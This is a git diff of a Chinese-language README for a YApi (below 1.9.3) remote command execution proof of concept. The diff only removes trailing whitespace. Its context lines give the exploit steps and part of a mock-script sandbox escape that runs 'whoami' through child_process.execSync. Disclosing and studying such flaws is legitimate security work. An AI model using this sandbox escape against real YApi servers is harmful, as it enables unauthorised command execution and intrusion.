@@ -5,13 +5,13 @@ YApi < 1.9.3
 ## POC
 1. 首页创建用户
 2. 添加项目  
-![](img/addProject.png)  
-![](img/addProject2.png)  
+![](img/addProject.png)
+![](img/addProject2.png)
 3. 添加接口  
-![](img/addInterface.png)   
-![](img/addInterface2.png)  
+![](img/addInterface.png)
+![](img/addInterface2.png)
 4. 设置Mock
-![](img/setMock.png)  
+![](img/setMock.png)
 poc:  
 ```shell
 const sandbox = this
@@ -22,5 +22,5 @@ const process = myfun()
 mockJson = process.mainModule.require("child\_process").execSync("whoami").toString()
 ```
 5. 访问Mock地址
-![](img/getshell.png)  
+![](img/getshell.png)
 命令执行成功
